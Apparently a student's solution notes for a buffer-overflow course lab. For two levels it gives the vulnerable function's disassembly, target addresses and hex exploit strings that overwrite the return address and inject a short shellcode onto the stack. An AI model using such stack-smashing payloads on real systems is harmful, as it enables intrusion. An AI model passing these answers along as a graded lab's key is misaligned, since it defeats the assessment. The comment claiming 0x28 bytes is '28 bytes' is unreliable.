# Solution With Notes

## Level 1
- touch1 address: 0x00000000004017c0

```
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp      // Allocates 28 bytes
  ...
```

**String**: 
```
00 00 00 00 00 00 00 00 /* 0x28 filler characters */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
c0 17 40 00 00 00 00 00 /* touch1 address */
```

## Level 2
- touch2 address: 0x00000000004017ec

<ins> Exploit code:
```
   0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
   5:	c3                   	ret    
```

<ins> Format: 
  1. 0x28 filler
  2. address of exploit code  <- %rsp on getbuf ret
  3. address of touch2        <- %rsp on exploit code ret
  4. exploit code

- Exploit code address: getbuf starting %rsp + 16 = 0x55685fc0 + 0x10 = 0x55685fd0

**String**:
```
00 00 00 00 00 00 00 00 /* 0x28 filler characters */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
d0 5f 68 55 00 00 00 00 /* exploit code address */
ec 17 40 00 00 00 00 00 /* touch2 address */
bf fa 97 b9 59 c3       /* exploit code */
```
